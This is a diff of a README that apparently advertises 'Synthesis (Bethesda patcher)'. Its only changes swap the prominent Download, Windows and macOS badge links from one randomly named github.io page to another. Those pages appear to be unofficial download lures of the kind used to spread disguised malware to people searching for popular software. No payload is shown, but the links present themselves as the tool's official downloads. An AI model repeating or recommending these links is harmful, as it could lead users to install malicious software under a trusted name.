@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Synthesis (Bethesda patcher) provides th
 
 <div align="center">
 
-[![Download Synthesis (Bethesda patcher)](https://img.shields.io/badge/⬇_DOWNLOAD_Synthesis+(Bethesda+patcher)-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Synthesis (Bethesda patcher)](https://img.shields.io/badge/⬇_DOWNLOAD_Synthesis+(Bethesda+patcher)-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Synthesis (Bethesda patcher) provides th
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
